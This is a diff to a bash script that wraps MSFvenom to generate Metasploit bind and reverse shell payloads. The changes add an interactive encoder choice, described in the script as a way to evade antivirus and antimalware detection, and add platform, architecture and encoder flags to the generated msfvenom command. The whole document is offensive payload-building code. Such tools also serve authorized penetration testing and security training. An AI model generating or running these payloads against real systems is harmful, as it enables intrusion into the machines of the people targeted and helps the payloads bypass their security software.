@@ -1,3 +1,4 @@
+
 #!/bin/bash
 #A script that creates a wrapper around MSFvenom and allows for easier payload generation.
 
@@ -34,6 +35,7 @@ esac
 validate_arc
 
 #Sets arc to "" for Windows 32 bit.
+
 no_arc_display(){
 case $OS in
         windows)
@@ -100,12 +102,14 @@ esac
 case $architecture in
 	32)
 		arc="/x86"
+		arc_display="-a x86"
 		no_arc_display
 		linux_x86_meterpreter
 	;;
 
 	64)
 		arc="/x64"
+		arc_display="-a x64"
 		meterpreter_question
 	;;
 esac
@@ -166,6 +170,7 @@ do
 done
 }
 
+
 #Case questions for users that want bind or reverse shells
 ip_port=""
 
@@ -210,6 +215,49 @@ esac
 
 validate_form
 
+#Asks user the type of encoder they would like to use. 
+validate_encoding(){
+echo "Which encoder would you like? Please specify 1 for x86/shikata_ga_nai, 2 for ruby/base64, 3 for cmd/powershell_base64, 4 for x64/xor."
+read enc_format
+case $enc_format in 
+	1)
+	enc_format="-e x86/shikata_ga_nai"
+	;;
+	2)
+	enc_format="-e ruby/base64"
+	;;
+	3)
+	enc_format="-e cmd/powershell_base64"
+	;;
+	4)
+	enc_format="-e x64/xor"
+	;;
+	*)
+	echo "$enc_format is not an option listed."
+	validate_encoding
+	;;
+esac
+}
+
+#Asks user if they would like to encode payload and checks if user entry.
+encoder_question(){
+echo "Would you like to use an encoder to evade antivirus or antimalware detection? Please indicate y for yes and n for no."
+read enc_question
+case $enc_question in
+	y)
+	validate_encoding
+	;;
+	n)
+	;;
+	*)
+	echo "$enc_question is not an option listed."
+	encoder_question
+	;;
+esac
+}
+
+encoder_question
+
 #Asks user for desired filename.
 echo "What would you like to name the file?"
 read filename
@@ -219,11 +267,11 @@ payload=""
 msfgen=""
 
 use_meterpreter() {
-	msfgen="${payload}${stage_symbol}${shell}_tcp ${ip_port} -f $format"
+	msfgen="${payload}${stage_symbol}${shell}_tcp ${ip_port} --platform ${OS} ${arc_display} ${enc_format} -f $format"
 }
 
 no_meterpreter() {
-        msfgen="${payload}${stage_symbol}${shell}_tcp ${ip_port} -f $format"
+        msfgen="${payload}${stage_symbol}${shell}_tcp ${ip_port} --platform ${OS} ${arc_display} ${enc_format} -f $format"
 }
 
 case  $meterpreter  in
